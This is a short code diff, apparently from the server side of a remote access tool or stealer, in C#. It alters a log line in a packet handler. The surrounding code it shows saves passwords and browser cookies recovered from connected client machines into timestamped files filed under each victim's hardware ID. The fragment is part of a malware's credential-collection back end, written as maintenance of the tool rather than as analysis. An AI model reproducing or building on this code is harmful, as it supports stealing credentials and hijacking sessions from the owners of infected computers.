@@ -26,7 +26,7 @@ namespace Server.Handle_Packet
                         Directory.CreateDirectory(fullPath);
                     File.WriteAllText(fullPath + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", pass.Replace("\n", Environment.NewLine));
                     File.WriteAllText(fullPath + "\\Cookies_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", cookies);
-                    new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} recovered passwords successfully", Color.Purple);
+                    new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} recovered passwords successfully @ ClientsFolder \\ {unpack_msgpack.ForcePathObject("Hwid").AsString} \\ Recovery", Color.Purple);
                 }
                 else
                 {
